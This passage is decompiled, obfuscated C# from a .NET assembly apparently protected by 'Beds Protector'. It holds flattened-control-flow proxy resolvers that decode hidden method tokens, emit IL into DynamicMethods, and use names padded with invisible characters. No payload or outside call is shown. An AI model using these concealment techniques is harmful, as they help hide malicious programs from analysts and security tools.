        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[2] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog8bThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog8bᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog9bThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog9bᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 10718 - 83603 + 72885;
    FieldInfo fieldFromHandle;
    Type[] parameterTypes;
    Type fieldType;
    MethodBase method;
    Type declaringType;
    MethodInfo methodInfo;
    DynamicMethod dynamicMethod;
    do
    {
      int index1;
      if (num1 == 89029 - 50330 - 38676)
      {
        ++index1;
        num1 = 2228 - 26681 + 24477;
      }
      byte[] numArray;
      int num2;
      int metadataToken;
      if (num1 == 92551 - 62644 - 29903)
      {
        int num3;
        int num4;
        int num5;
        int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[4] ^ (int) numArray[num3 = num2 - 1]) << 0) + (((int) fieldFromHandle.Name[3] ^ (int) numArray[num4 = num3 - 1]) << 8) + (((int) fieldFromHandle.Name[0] ^ (int) numArray[num5 = num4 - 1]) << 16);
        int num7 = num5 - 1;
        int num8 = ((int) fieldFromHandle.Name[1] ^ (int) numArray[num2 = num7 - 1]) << 24;
        metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogaBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogaBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
        num1 = 59159 - 105134 + 45980;
      }
      if (num1 == 80644 - 34235 - 46406)
      {
        num2 = numArray.Length;
        num1 = 23054 - 71556 + 48506;
      }
      int index2;
      if (num1 == 67754 - 105485 + 37745)
      {
        index2 = 0;
        num1 = 82006 - 55306 - 26685;
      }
      if (num1 != 52750 + 5980 - 58709)
      {
        if (num1 == 96990 - 79494 - 17484)
        {
          parameterTypes = (Type[]) null;
          num1 = 60924 + 1594 - 62505;
        }
        if (num1 == 20433 - 79316 + 58903)
        {
          index1 = 0;
          num1 = 48864 + 43836 - 92679;
        }
        if (num1 != 80059 - 132808 + 52764)
        {
          if (num1 == 29726 - 80061 + 50336)
          {
            fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
            num1 = 77803 - 55990 - 21811;
          }
          if (num1 == 28479 + 35140 - 63612)
          {
            fieldType = fieldFromHandle.FieldType;
            num1 = 11991 - 59270 + 47287;
          }
          if (num1 == 65768 - 30447 - 35296)
          {
            declaringType = method.DeclaringType;
            num1 = 82182 - 104402 + 22246;
          }
          if (num1 != 28496 - 127376 + 98904)
            goto label_24;
        }
        else
          goto label_57;
      }
      if (index1 >= parameterTypes.Length)
        num1 = 12328 + 83901 - 96204;
      else
        goto label_36;
label_24:
      MethodInfo[] methods;
      if (num1 == 89602 - 47059 - 42530)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 53244 + 45066 - 98296;
      }
      if (num1 == 73920 - 151912 + 78009)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 35472 - 25552 - 9902;
        }
        else
        {
          ++index2;
          goto label_57;
        }
      }
      if (num1 == 97384 - 4563 - 92816)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 95673 - 128270 + 32603;
      }
      if (num1 == 98893 - 5180 - 93705)
      {
        if (method.IsStatic)
          num1 = 11616 - 96270 + 84663;
        else
          goto label_42;
      }
      if (num1 == 57383 - 146146 + 88773)
        return;
      if (num1 != 33350 + 24332 - 57660)
        goto label_37;
label_36:
      ParameterInfo[] parameters;
      parameterTypes[index1] = parameters[index1].ParameterType;
      num1 = 54132 - 73153 + 19044;
label_37:
      if (num1 == 79280 - 84353 + 5075)
      {
        numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 65316 - 45465 - 19848;
      }
      if (num1 != 69277 - 52982 - 16279)
        goto label_41;
label_40:
      methodInfo = methods[index2];
      num1 = 25393 - 68357 + 42981;
label_41:
      if (num1 != 29430 - 16824 - 12595)
        goto label_43;
label_42:
      dynamicMethod = (DynamicMethod) null;
      num1 = 66300 - 160466 + 94178;
label_43:
      if (num1 == 2498 - 48330 + 45851)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 57867 - 61917 + 4070;
      }
      if (num1 == 65798 + 9522 - 75314)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 47450 + 30003 - 77446;
      }
      if (num1 == 52241 - 21246 - 30986)
      {
        fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
        num1 = 2620 + 73771 - 76381;
      }
      if (num1 == 42862 + 27528 - 70372)
      {
        parameters = methodInfo.GetParameters();
        num1 = 73857 - 26067 - 47771;
      }
      if (num1 == 68383 - 55305 - 13078)
        num1 = 22471 + 45791 - 68261;
      continue;
label_57:
      if (index2 < methods.Length)
        goto label_40;
      else
        goto label_58;
    }
    while (num1 != 35410 - 96201 + 60817);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[2] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogaBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogaBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogABThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogABᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 63481 - 73696 + 10215;
    MethodBase method;
    Type[] parameterTypes;
    DynamicMethod dynamicMethod;
    MethodInfo methodInfo;
    Type fieldType;
    FieldInfo fieldFromHandle;
    Type declaringType;
    do
    {
      if (num1 == 73193 - 70796 - 2389)
      {
        if (method.IsStatic)
          num1 = 1005 - 95662 + 94666;
        else
          goto label_7;
      }
      if (num1 != 44533 - 25355 - 19156)
        goto label_6;
label_5:
      int index1;
      ParameterInfo[] parameters;
      parameterTypes[index1] = parameters[index1].ParameterType;
      num1 = 38833 - 80355 + 41545;
label_6:
      if (num1 != 11995 - 28414 + 16430)
        goto label_8;
label_7:
      dynamicMethod = (DynamicMethod) null;
      num1 = 15228 + 36214 - 51430;
label_8:
      byte[] numArray;
      int num2;
      int metadataToken;
      int index2;
      if (num1 != 11855 + 23806 - 35646)
      {
        if (num1 != 90991 - 133286 + 42316)
        {
          if (num1 == 16628 - 108229 + 91618)
          {
            if ((object) methodInfo.DeclaringType == (object) fieldType)
            {
              num1 = 74227 + 20770 - 94979;
            }
            else
            {
              ++index2;
              goto label_57;
            }
          }
          if (num1 == 3796 + 73991 - 77783)
          {
            int num3;
            int num4;
            int num5;
            int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[3] ^ (int) numArray[num3 = num2 - 1]) << 16) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num4 = num3 - 1]) << 24) + (((int) fieldFromHandle.Name[4] ^ (int) numArray[num5 = num4 - 1]) << 0);
            int num7 = num5 - 1;
            int num8 = ((int) fieldFromHandle.Name[2] ^ (int) numArray[num2 = num7 - 1]) << 8;
            metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogbBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogbBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
            num1 = 75705 - 72636 - 3064;
          }
          if (num1 != 30238 + 28615 - 58837)
            goto label_17;
        }
        else
          goto label_37;
      }
      else
        goto label_57;
label_16:
      MethodInfo[] methods;
      methodInfo = methods[index2];
      num1 = 71533 - 26088 - 45428;
label_17:
      if (num1 == 51831 - 71066 + 19260)
      {
        declaringType = method.DeclaringType;
        num1 = 13631 + 9387 - 22992;
      }
      if (num1 == 74568 - 106496 + 31930)
      {
        numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 45370 + 46695 - 92062;
      }
      if (num1 == 52350 - 7660 - 44681)
      {
        fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
        num1 = 18352 + 66049 - 84391;
      }
      if (num1 == 49927 - 105007 + 55081)
      {
        fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
        num1 = 21451 - 33698 + 12249;
      }
      if (num1 == 25676 + 73646 - 99316)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 32581 - 92506 + 59932;
      }
      if (num1 == 96857 - 66900 - 29934)
      {
        ++index1;
        num1 = 96887 - 192259 + 95396;
      }
      if (num1 == 15248 + 33847 - 49085)
        return;
      if (num1 == 63048 - 46522 - 16508)
      {
        parameters = methodInfo.GetParameters();
        num1 = 6142 + 85721 - 91844;
      }
      if (num1 == 58383 - 65724 + 7346)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 74445 - 31868 - 42571;
      }
      if (num1 == 90346 - 53354 - 36973)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 84583 + 7010 - 91573;
      }
      if (num1 != 23675 - 18001 - 5650)
        goto label_39;
label_37:
      if (index1 >= parameterTypes.Length)
        num1 = 18584 + 71997 - 90556;
      else
        goto label_5;
label_39:
      if (num1 == 62127 - 144370 + 82257)
      {
        index2 = 0;
        num1 = 49284 - 34307 - 14962;
      }
      if (num1 == 35305 - 80324 + 45022)
      {
        num2 = numArray.Length;
        num1 = 29618 - 64541 + 34927;
      }
      if (num1 == 95740 - 120479 + 24746)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 7472 - 14361 + 6897;
      }
      if (num1 == 45279 + 52586 - 97852)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 87362 - 62506 - 24842;
      }
      if (num1 == 13097 + 58423 - 71500)
      {
        index1 = 0;
        num1 = 57511 - 53276 - 4214;
      }
      if (num1 == 19811 - 97256 + 77457)
      {
        parameterTypes = (Type[]) null;
        num1 = 41952 + 25952 - 67891;
      }
      if (num1 == 20777 + 9586 - 30363)
        num1 = 92383 - 52078 - 40304;
      continue;
label_57:
      if (index2 < methods.Length)
        goto label_16;
      else
        goto label_58;
    }
    while (num1 != 97549 - 169500 + 71977);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[0] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogbBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogbBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogBBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogBBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 45770 + 2045 - 47815;
    MethodInfo methodInfo;
    MethodBase method;
    Type[] parameterTypes;
    FieldInfo fieldFromHandle;
    Type fieldType;
    DynamicMethod dynamicMethod;
    Type declaringType;
    do
    {
      ParameterInfo[] parameters;
      if (num1 == 980 + 66827 - 67789)
      {
        parameters = methodInfo.GetParameters();
        num1 = 98753 - 71307 - 27427;
      }
      if (num1 == 92704 - 141618 + 48922)
      {
        if (method.IsStatic)
          num1 = 57415 - 62771 + 5365;
        else
          goto label_29;
      }
      if (num1 != 43462 - 79787 + 36349)
        goto label_9;
label_7:
      int index1;
      if (index1 >= parameterTypes.Length)
        num1 = 26569 + 40807 - 67351;
      else
        goto label_15;
label_9:
      if (num1 == 57470 - 121790 + 64330)
        return;
      int index2;
      if (num1 == 76534 - 159791 + 83271)
      {
        index2 = 0;
        num1 = 57547 - 103344 + 45812;
      }
      if (num1 == 52865 - 68422 + 15566)
      {
        fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
        num1 = 23684 - 52422 + 28748;
      }
      if (num1 != 35237 + 36425 - 71640)
        goto label_16;
label_15:
      parameterTypes[index1] = parameters[index1].ParameterType;
      num1 = 50029 - 1177 - 48829;
label_16:
      if (num1 == 18969 - 37200 + 18238)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 36356 + 24997 - 61345;
      }
      if (num1 == 3954 - 54852 + 50921)
      {
        ++index1;
        num1 = 36880 + 4625 - 41481;
      }
      MethodInfo[] methods;
      if (num1 == 83485 - 65156 - 18316)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 56531 + 2691 - 59208;
      }
      if (num1 == 40797 + 44155 - 84951)
      {
        fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
        num1 = 31375 + 3109 - 34482;
      }
      if (num1 != 89799 - 2673 - 87110)
        goto label_26;
label_25:
      methodInfo = methods[index2];
      num1 = 81163 + 7601 - 88747;
label_26:
      if (num1 == 95710 - 59151 - 36540)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 30234 + 15501 - 45715;
      }
      if (num1 != 46859 - 58128 + 11280)
        goto label_30;
label_29:
      dynamicMethod = (DynamicMethod) null;
      num1 = 21925 - 54984 + 33071;
label_30:
      if (num1 == 94890 - 83076 - 11802)
      {
        parameterTypes = (Type[]) null;
        num1 = 6639 + 74085 - 80711;
      }
      if (num1 == 88427 + 10432 - 98839)
      {
        index1 = 0;
        num1 = 85680 + 12432 - 98091;
      }
      if (num1 != 63877 - 16236 - 47620)
      {
        if (num1 == 74235 - 126569 + 52359)
        {
          declaringType = method.DeclaringType;
          num1 = 62174 - 25014 - 37134;
        }
        byte[] numArray;
        int num2;
        int metadataToken;
        if (num1 == 4940 - 77023 + 72087)
        {
          int num3;
          int num4;
          int num5;
          int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[2] ^ (int) numArray[num3 = num2 - 1]) << 0) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num4 = num3 - 1]) << 8) + (((int) fieldFromHandle.Name[0] ^ (int) numArray[num5 = num4 - 1]) << 24);
          int num7 = num5 - 1;
          int num8 = ((int) fieldFromHandle.Name[3] ^ (int) numArray[num2 = num7 - 1]) << 16;
          metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogcBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogcBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
          num1 = 72600 - 143277 + 70682;
        }
        if (num1 == 33639 + 47927 - 81564)
        {
          numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
          num1 = 4434 + 51879 - 56310;
        }
        if (num1 == 56904 + 22680 - 79578)
        {
          method = fieldFromHandle.Module.ResolveMethod(metadataToken);
          num1 = 6398 - 77039 + 70648;
        }
        if (num1 != 89907 - 91458 + 1566)
        {
          if (num1 == 98094 - 114429 + 16338)
          {
            num2 = numArray.Length;
            num1 = 82136 - 24893 - 57239;
          }
          if (num1 == 80712 - 41371 - 39324)
          {
            if ((object) methodInfo.DeclaringType == (object) fieldType)
            {
              num1 = 74667 - 146864 + 72215;
            }
            else
            {
              ++index2;
              goto label_57;
            }
          }
          if (num1 == 69284 + 8623 - 77902)
          {
            metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
            num1 = 28157 - 111795 + 83644;
          }
          if (num1 == 16527 - 8887 - 7640)
            num1 = 91310 - 110793 + 19484;
          continue;
        }
label_57:
        if (index2 < methods.Length)
          goto label_25;
        else
          goto label_58;
      }
      else
        goto label_7;
    }
    while (num1 != 49566 - 148724 + 99184);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[4] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogcBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogcBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

